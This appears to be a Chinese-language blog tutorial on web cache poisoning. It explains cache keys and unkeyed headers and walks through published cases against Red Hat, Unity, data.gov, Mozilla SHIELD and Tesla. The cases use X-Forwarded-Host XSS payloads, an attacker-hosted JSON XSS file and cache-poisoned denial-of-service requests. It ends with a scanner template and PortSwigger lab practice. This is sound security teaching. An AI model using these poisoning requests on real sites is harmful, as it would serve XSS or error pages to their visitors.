+<p>1） Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间。</p>
+<p>2）如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存。</p>
+<p>3）有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。</p>
+<p>Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。Last-Modified与ETag是可以一起使用的，服务器会优先验证ETag，一致的情况下，才会继续比对Last-Modified，最后才决定是否返回304。</p>
+<p>如下图etag和last-modified同时存在，优先使用etag。</p>
+ <img src="../images/pics/web缓存投毒攻击/image-20210218134240191.png" alt="image-20210218134240191" style="zoom:50%;" />
+
+
+
+
+
+
+
+<h3 id="1-4-cache-key"><a href="#1-4-cache-key" class="headerlink" title="1.4 cache key"></a>1.4 cache key</h3><p>当缓存收到一个请求，它需要判断是否存有该请求的响应，如果有就直接返回，没有就将该请求转发到服务器。</p>
+<p>缓存为了确定本次请求的响应是否存在，它需要拿本次请求和之前保留的做匹配，如果匹配上就说明存有响应。匹配时如果一个字节一个字节的比较效率会很低，因为HTTP请求充斥着对于cache来说无关紧要的信息，比如User-Agent。</p>
+<p>为了解决这个问题，提出了cache key的概念。cache key就是用来使用http请求的其中几个元素来确认这个资源之前被请求过。</p>
+<pre>GET <font color="red">/blog/post.php?mobile=1</font> HTTP/1.1
+Host: <font color="red">example.com</font>
+User-Agent: Mozilla/5.0 … Firefox/57.0
+Accept: */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://google.com/
+Cookie: jessionid=xyz;
+Connection: close</pre>
+
+
+<p>比如上面的请求包的 cache key 就是:</p>
+<pre>    Cache Key: https|GET|example.com|/blog/post.php?mobile=1</pre>
+
+<p>大多数cache key是host和路由，但这并不是绝对的。</p>
+<p>如果一个非cache key的缓存资源被污染了，那么后续用户访问同一个cache key的资源会被影响。</p>
+<p>如下两个请求对于cache来说是一样的，请求1的响应会是请求2的响应。</p>
+<p>请求1:</p>
+<pre>GET /blog/post.php?mobile=1 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 … Firefox/57.0
+Cookie: language=<font color="red">pl</font>;
+Connection: close</pre>
+
+
+<p>请求2:</p>
+<pre>GET /blog/post.php?mobile=1 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 … Firefox/57.0
+Cookie: language=<font color=red>en</font>;
+Connection: close
+</pre>
+
+
+
+<p>结果就是发起第二个请求的人会收到错误的语言。这就是问题所在，任何一个不存在于 cache key的不同输入都有可能作为response存在于cache中，然后返回给其他用户。理论上网站可以使用响应头的’Vary’字段来制定将什么内容加入到 cache key ，比如加入<code>Vary: Cookie</code>那么缓存服务器就会比对Cookie是否也一样，上述两个请求肯定不一样，所以缓存服务器不会直接返回之前存储的内容，而是转发给服务器。但实际上，响应头的’Vary’基本都会被开发者忽略，像Cloudflare这种CDN厂商完全忽略’Vary’</p>
+<h3 id="1-5-unkeyed"><a href="#1-5-unkeyed" class="headerlink" title="1.5 unkeyed"></a>1.5 unkeyed</h3><p>unkeyed在本文中就是指不属于cache key，但是这个unkeyed值可能导致一些危害的参数或者HTTP头。</p>
+<h3 id="1-6-缓存投毒"><a href="#1-6-缓存投毒" class="headerlink" title="1.6 缓存投毒"></a>1.6 缓存投毒</h3><p>缓存投毒的攻击理念就是发起一个能导致有害响应的请求，让cache保存此响应，然后提供给其他用户。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210106201009322.png" alt="image-20210106201009322"></p>
+<p>本文主要讨论使用未加入 cache key的HTTP请求头的投毒方式，当然不止这一种，其他方式比如请求http 请求拆分、请求走私。其他方式将在后续的文章进行分享。类似的有一种<a target="_blank" rel="noopener" href="https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html">web缓存欺骗</a>的攻击方式，不要混淆了这两种攻击方式，后续有机会可以分享一下这种攻击方式。</p>
+<h3 id="1-7-缓存投毒的影响"><a href="#1-7-缓存投毒的影响" class="headerlink" title="1.7 缓存投毒的影响"></a>1.7 缓存投毒的影响</h3><p>缓存投毒的影响严重依赖以下两个重要因素。</p>
+<ul>
+<li>缓存投毒攻击的影响程度取决于注入的payload，和大多数攻击方式一样，缓存投毒需要和其他漏洞组合起来以提升危害性。</li>
+<li>访问量。因为缓存投毒的攻击目标是投毒后的资源访问群体，所以访问的人越多就危害越大。</li>
+</ul>
+<h3 id="1-8-如何进行一个缓存投毒漏洞的挖掘"><a href="#1-8-如何进行一个缓存投毒漏洞的挖掘" class="headerlink" title="1.8 如何进行一个缓存投毒漏洞的挖掘"></a>1.8 如何进行一个缓存投毒漏洞的挖掘</h3><p>总的来说，挖掘一个缓存投毒漏洞的步骤如下：</p>
+<p><strong>1. 确认unkeyed</strong></p>
+<p>第一步就是确认没有被纳入cache key的http请求头，通常是找参数或者请求头回显点能否和缓存关联，手工来检测是一项非常乏味的工作，因此作者开发了一款叫 Param Miner的 Burp Suite插件来自动挖掘。但是我在实际使用过程中效果很一般，找一些常见的请求头回显还是有点用的。</p>
+<p><strong>2. 构造利用手段</strong></p>
+<p>在找到unkeyed后，就是判断判断是否能够造成危害，通常的方法是结合xss等漏洞。</p>
+<h2 id="2-不同的攻击方式"><a href="#2-不同的攻击方式" class="headerlink" title="2. 不同的攻击方式"></a>2. 不同的攻击方式</h2><p>让我们看看作者讲的一些真实案例。通常，测试这些站点都是点到为止，不会对站点造成影响。由于这些站点都是公开站点，所以不可避免要修改一些内容。</p>
+<h3 id="2-1-redhat的一个投毒案例"><a href="#2-1-redhat的一个投毒案例" class="headerlink" title="2.1 redhat的一个投毒案例"></a>2.1 redhat的一个投毒案例</h3><p>主页中，<code>X-Forwarded-Host: canary</code>出现在了meta标签中。这里<code>X-Forwarded-Host: canary</code>就是unkeyed</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?cb=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.redhat.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>canary</span><br><span class="line"></span><br><span class="line"><span class="lasso">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="lasso"><span class="keyword">Cache</span><span class="params">-Control</span>: <span class="keyword">public</span>, no<span class="params">-cache</span></span></span><br><span class="line"><span class="lasso">…</span></span><br><span class="line"><span class="lasso">&lt;meta property=<span class="string">&quot;og:image&quot;</span> content=<span class="string">&quot;https://canary/cms/social.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了不影响其他用户，这里作者找到一个可以自己定义参数的页面，添加xss的poc。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?dontpoisoneveryone=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.redhat.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="xml">Cache-Control: public, no-cache</span></span><br><span class="line"><span class="xml">…</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">property</span>=<span class="string">&quot;og:image&quot;</span> <span class="attr">content</span>=<span class="string">&quot;https://a.&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;/&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p>成功触发了POC。但是这只是一个self xss，是没有什么危害性。但是如果存在缓存投毒，就可以将XSS存储到缓存中，之后访问的用户就会触发XSS。从而攻击到其他用户。</p>
+<h3 id="2-2-投毒时机"><a href="#2-2-投毒时机" class="headerlink" title="2.2 投毒时机"></a>2.2 投毒时机</h3><p>对于上面的例子，如果我们要对主页进行真的投毒攻击，我们可能会选择使用Burp Intruder模块进行持续性投毒，因为我们不知道缓存在什么时候过期，并且要在它刚好过期的时候投毒成功。如果持续发送大量数据包，可能会引起注意，这会让投毒攻击变得困难，当然，可以通过对缓存系统进行逆向、查看文档和监控等手段来预测到期时间，但是这听起来就是一项艰苦的任务，有时候往往比这简单。</p>
+<p>看下面的例子</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>unity3d.com</span><br><span class="line"><span class="attribute">X-Host</span><span class="punctuation">: </span>portswigger-labs.net</span><br><span class="line"></span><br><span class="line"><span class="routeros">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="routeros">Via: 1.1 varnish-v4</span></span><br><span class="line"><span class="routeros">Age: 174</span></span><br><span class="line"><span class="routeros">Cache-Control: public, <span class="attribute">max-age</span>=1800</span></span><br><span class="line"><span class="routeros">…</span></span><br><span class="line"><span class="routeros">&lt;script <span class="attribute">src</span>=<span class="string">&quot;https://portswigger-labs.net/sites/files/foo.js&quot;</span>&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>unity3d.com的响应头的Age和max-age分别提供了当前响应时间和过期时间，这为我们投毒时机做了明确的指引。</p>
+<h3 id="2-3-选择性投毒"><a href="#2-3-选择性投毒" class="headerlink" title="2.3 选择性投毒"></a>2.3 选择性投毒</h3><p>如下例子中，Vary响应头告诉我们User-Agent头可能是缓存键的一部分，手工测试也确实如此，这种情况我们就可以定制User-Agent来选择性攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>redacted.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 … Firefox/60.0</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a&quot;&gt;&lt;iframe onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="xml">X-Served-By: cache-lhr6335-LHR</span></span><br><span class="line"><span class="xml">Vary: User-Agent, Accept-Encoding</span></span><br><span class="line"><span class="xml">…</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;canonical&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://a&quot;</span>&gt;</span>a<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-4-DOM投毒"><a href="#2-4-DOM投毒" class="headerlink" title="2.4 DOM投毒"></a>2.4 DOM投毒</h3><p>如下的案例中，非缓存键是<code>X-Forwarded-Host: canary</code>，但是此处对XSS做了防御，不能直接利用XSS进行攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/dataset</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>catalog.data.gov</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>canary</span><br><span class="line"></span><br><span class="line"><span class="routeros">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="routeros">Age: 32707</span></span><br><span class="line"><span class="routeros">X-Cache: Hit <span class="keyword">from</span> cloudfront </span></span><br><span class="line"><span class="routeros">…</span></span><br><span class="line"><span class="routeros">&lt;body <span class="attribute">data-site-root</span>=<span class="string">&quot;https://canary/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>作者在Burp Suite中做了一个替换，将canary替换为了类似<code>xxx.dnslog.cn</code>的dnslog地址，然后继续浏览，在dnslog平台收到了来自Firefox的如下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/i18n/en</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.dnslog.net</span><br></pre></td></tr></table></figure>
+
+<p>这个路径应该是藏在该站的某处，通过访问<code>https://catalog.data.gov/api/i18n/en</code>发现返回空的json数据。作者将en改为es，发现了一点蛛丝马迹。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/i18n/es</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>catalog.data.gov</span><br><span class="line"></span><br><span class="line"><span class="smalltalk"><span class="type">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="type">OK</span></span></span><br><span class="line"><span class="smalltalk">…</span></span><br><span class="line"><span class="smalltalk">&#123;<span class="comment">&quot;Show more&quot;</span>:<span class="comment">&quot;Mostrar más&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个文件将词组翻译成用户选择的语言，于是，作者在自己的vps上部署了一个相同路径的json XSS POC <code>&#123;&quot;Show more&quot;:&quot;&lt;svg onload=alert(1)&gt;&quot;&#125;</code>。发送如下数据包，投毒成功。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string"></span> /api/i18n/en <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> portswigger-labs.net</span><br><span class="line"></span><br><span class="line"><span class="erlang">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="erlang">...</span></span><br><span class="line"><span class="erlang">&#123;<span class="string">&quot;Show more&quot;</span>:<span class="string">&quot;&lt;svg onload=alert(1)&gt;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果就是任何页面包含“show more”都会执行POC。</p>
+<h3 id="2-5-劫持-Mozilla-SHIELD系统"><a href="#2-5-劫持-Mozilla-SHIELD系统" class="headerlink" title="2.5 劫持 Mozilla SHIELD系统"></a>2.5 劫持 Mozilla SHIELD系统</h3><p>在测试<code> catalog.data.gov</code>的时候，log上还发现了如下的请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/recipe/signed/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 … Firefox/57.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+
+<p>这个请求的小写<code>origin</code>引起了作者的注意。通过查询代理记录，发现是firefox的问题。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normandy.cdn.mozilla.net</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br><span class="line"></span><br><span class="line"><span class="dts">HTTP/<span class="number">1.1</span> <span class="number">200</span> <span class="class">OK</span></span></span><br><span class="line"><span class="class"><span class="dts"></span>&#123;</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;action-list&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/action/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;action-signed&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/action/signed/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;recipe-list&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/recipe/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;recipe-signed&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/recipe/signed/&quot;</span>,</span></span><br><span class="line"><span class="dts">   …</span></span><br><span class="line"><span class="dts">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过查询得知，该系统是<a target="_blank" rel="noopener" href="https://wiki.mozilla.org/Firefox/Shield">SHIELD</a>，一个FIrefox的基础设施，用来营销和研究用户。只要打开firefox，就会定期请求。意味着作者可以控制数以千万的用户访问某个地址，因此可以被用于DDOS攻击。</p>
+<h3 id="2-6-CPDOS"><a href="#2-6-CPDOS" class="headerlink" title="2.6 CPDOS"></a>2.6 CPDOS</h3><p>Cache-Poisoned Denial-of-Service (CPDoS)，由缓存投毒导致的DOS攻击。当攻击者插入一个unkeyed导致服务器返回400等其他异常，如果写入缓存，那么后续访问者只要访问该资源都会是400 状态码。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224135625306.png" alt="image-20210224135625306"></p>
+<h4 id="三种不同的CPDOS"><a href="#三种不同的CPDOS" class="headerlink" title="三种不同的CPDOS"></a>三种不同的CPDOS</h4><p><strong>超大请求头</strong></p>
+<p>HTTP Header Oversize(HHO)。<a target="_blank" rel="noopener" href="https://httpwg.org/specs/">HTTP标准协议</a>没有给HTTP请求头设置任何大小限制，显然web服务器、web框架以及各种中间系统自己定义了HTTP请求头的大小限制。大多数web服务器或者代理服务器比如<a target="_blank" rel="noopener" href="https://httpd.apache.org/">Apache HTTP Server (“httpd”)</a>限制请求头在8,192字节左右。然而有些网站中间层系统限制大于8,192字节。 比如<a target="_blank" rel="noopener" href="https://aws.amazon.com/cloudfront/">Amazon Cloudfront CDN</a> 最大允许 20,480字节。</p>
+<p>具体的攻击方式就是给unkeyed添加一个字节数小于缓存的请求头，但大于服务端的请求头，服务端就会返回错误然后存入缓存。之后请求该资源返回结果就是错误的响应。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224143048453.png" alt="image-20210224143048453"></p>
+<p><strong>HTTP元字符</strong></p>
+<p>HTTP Meta Character (HMC)。常见的元字符比如<code>\n</code>、 <code>\r</code> 、<code>\a</code>这些用于在HTTP请求中表示换行的以下字符。HMC类似于HHO，只是将有害的元字符替换了超大请求头</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224145431373.png" alt="image-20210224145431373"></p>
+<p><strong>重写HTTP请求方法</strong></p>
+<p>HTTP Method Override (HMO)。HTTP标准协议定义了GET、POST、DELETE和PUT四种请求方法。许多代理服务器、负载均衡、缓存、防火墙等只支持GET和POST。为了解决这个问题，一些基于REST的API或者web框架提供了例如X-HTTP-Method-Override、X-HTTP-Method、X-Method-Override等请求头来转换HTTP 请求方法。一旦请求到达服务器，服务器就会根据请求头修改请求方法，</p>
+<pre>POST /items/1 HTTP/1.1
+Host: example.org
+<font color="red">X-HTTP-Method-Override: DELETE</font></pre>
+
+
+
+
+<pre>HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 62
+
+
+Resource has been successfully removed with the DELETE method.</pre>
+
+
+
+<p>上诉代码通过添加请求头bypass了不允许的请求方法，同样的如果修改请求头会导致错误响应并且写入缓存，那么也是一个DOS攻击。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224152322209.png" alt="image-20210224152322209"></p>
+<p>不同服务器及CDN的影响情况。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224163837785.png" alt="image-20210224163837785"></p>
+<h4 id="特斯拉的一个缓存DOS漏洞"><a href="#特斯拉的一个缓存DOS漏洞" class="headerlink" title="特斯拉的一个缓存DOS漏洞"></a>特斯拉的一个缓存DOS漏洞</h4><p>漏洞地址：<a target="_blank" rel="noopener" href="https://www.tesla.com/en_GB/roadster">https://www.tesla.com/en_GB/roadster</a></p>
+<p>漏洞原因就是特斯拉的waf只要发现<code>burpcollaborator.net</code>就会Denied。并且waf是有缓存的，所以命中缓存后，请求该资源就会是Denied。如下添加<code>dontpoisoneveryone=1</code>是为了不响应正常用户，真实的攻击的话肯定会直接给<a target="_blank" rel="noopener" href="https://www.tesla.com/en_GB/roadster%E6%8A%95%E6%AF%92%E3%80%82">https://www.tesla.com/en_GB/roadster投毒。</a></p>
+<pre><font>GET /en_GB/roadster?dontpoisoneveryone=1</font> HTTP/1.1
+<font color="red">Host: www.tesla.com</font>
+Any-Header: burpcollaborator.net</pre>
+
+
+
+<pre>HTTP/1.1 403 Forbidden
+<br>Access Denied. Please contact waf@tesla.co</pre>
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="3-靶场"><a href="#3-靶场" class="headerlink" title="3. 靶场"></a>3. 靶场</h2><p>靶场练习可以使用James Kettle的工具Param Miner(BurpSuite应用商店可找到)。但是我觉得这个工具比较慢比较耗费电脑资源。所以我自己编写了Jaeles漏洞扫描器的一些简单检测插件，由于对插件逻辑不是太熟悉再加上时间不够，目前只完成快速检测回显，后续会加入投毒比对，然后就可以批量检测，而不需要像Param Miner一个站点一个站点的去看了。</p>
+<h3 id="3-1-缓存判断插件"><a href="#3-1-缓存判断插件" class="headerlink" title="3.1 缓存判断插件"></a>3.1 缓存判断插件</h3><p>挖掘一个缓存投毒漏洞的时候，首先要考虑unkeyed的请求是否存在缓存，如果没有缓存就没必要测试缓存问题，判断是否有缓存我们可以通过响应中的特定参数，比如cache-control和expire来判断。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">cacheable</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cacheable</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.Raw&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">headers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55&#x27;</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;Cache-Control: max-age=\d*&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;ETag:&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;Last-Modified:&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">RegexSearch(&quot;resHeaders&quot;,</span> <span class="string">&quot;Expires:&quot;</span><span class="string">)</span>  </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="3-2-Param-Miner的使用"><a href="#3-2-Param-Miner的使用" class="headerlink" title="3.2 Param Miner的使用"></a>3.2 Param Miner的使用</h3><p>直接在BurpSuite的应用商店找到，点击安装即可。</p>
+<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224090312085.png" alt="image-20210224090312085"></p>
+<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/PortSwigger/param-miner">https://github.com/PortSwigger/param-miner</a></p>
+<p>工具的原理是字典结合比对的方式实现的，比如它要测试x-forwarded-for这个参数是否存在投毒。</p>
+<p>它会重复发送两种数据包一个是x-forwarded-for: test，一个是x-forwarded-forxxxx: 1111。如果x-forwarded-forxxxx: 1111的结果是test，就说明投毒成功。为了安全性，param miner会在每个请求的url参数HTTP请求里添加随机参数，以避免影响到正常用户。</p>
+<p>除了测试缓存投毒以外，param miner很重要的一个功能是猜测参数、额外的HTTP请求头，DOS攻击。猜测参数它内置了一个字典，该字典是爬取的github上的常见参数组成的字典。</p>
+<p>如下图是安装好后，鼠标右键出现的一些选项。</p>
+<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091125193.png" alt="image-20210224091125193"></p>
+<p>可以在顶部按钮点击进行配置，当然也可以测试的时候单独配置。配置项里面一般默认配置就可以了，如果其他配置，可以根据需要勾选。一般我们右键直接<code>Guess everything</code>就好了，但是一般这样很慢，所以有时候选择只猜测请求头也是不错的<code>Guess headers</code></p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091533071.png" alt="image-20210224091533071"></p>
+<h3 id="3-3-X-Forwarded-Host-投毒"><a href="#3-3-X-Forwarded-Host-投毒" class="headerlink" title="3.3 X-Forwarded-Host 投毒"></a>3.3 X-Forwarded-Host 投毒</h3><p>这个漏洞通过对X-Forward-Host投毒，将self xss转化对任意用户的xss攻击。</p>
+<p>首先访问<code>PortSwigger</code>的 <code>Lab: Web cache poisoning with an unkeyed header</code>实验，<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header">实验地址</a></p>
+<p>访问后如下所示</p>
+<img src="../images/pics/web缓存投毒攻击/image-20210126145541074.png" alt="image-20210126145541074" style="zoom:50%;" />
+
+
+
+<h4 id="确认unkeyed"><a href="#确认unkeyed" class="headerlink" title="确认unkeyed"></a>确认unkeyed</h4><p>首先测试一下请求头是否会直接返回到响应中，因为缓存投毒攻击最常见的就是host头的投毒，我编写了一个针对X-Forward-Host回显的jaeles扫描器插件。</p>
